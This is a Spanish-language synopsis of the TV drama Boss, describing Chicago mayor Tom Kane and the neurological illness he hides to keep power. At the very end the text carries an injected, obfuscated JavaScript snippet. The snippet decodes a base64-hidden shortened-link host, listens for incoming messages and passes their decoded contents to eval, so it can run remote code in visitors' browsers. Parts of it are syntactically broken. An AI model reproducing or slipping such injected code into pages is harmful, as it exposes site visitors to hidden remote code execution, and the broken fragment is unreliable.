Descripcion
Boss se centra en las maquiavélicas maquinaciones de Tom Kane, un ficticio alcalde de Chicago que esconde un oscuro secreto. Duro cuando la situación lo requiere y carismático cuando es necesario, es un político de carrera y uno muy bueno. Como alcalde, Kane no es un extraño en las intrigas políticas por las que es conocida la ciudad. Conoce el juego y lo hace bien. Ciertos negocios lo han convertido en el hombre más poderoso del estado de Illinois, pero no sin sacrificio: su fría y mutua malentendida relación con su esposa y su tensa relación con su hija, Emma, son pérdidas que debe superar. Pero su reinado de poder se ve amenazado cuando descubre que sufre una grave enfermedad que deberá esconder para conseguir mantener el control de la ciudad.
El alcalde Tom Kane (Kelsey Grammer, Frasier) se sienta como una araña en el centro de la red de poder de Chicago, una red construida tras un pacto con su gente. Ellos quieren ser liderados, quieren que le resuelvan las disputas, que les consigan trabajo y que les recompensen sus lealtades. Si lo consigue mediante el engaño y una dudosa moralidad, que así sea. Mientras se haga el trabajo, ellos miran para otro lado. Y a pesar de ser el alcalde más efectivo de la historia reciente, una enfermedad neurológica degenerativa le está arrebatando su vida. Ya no puede fiarse de sus recuerdos, de sus aliados más cercanos y ni siquiera de sí mismo.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();

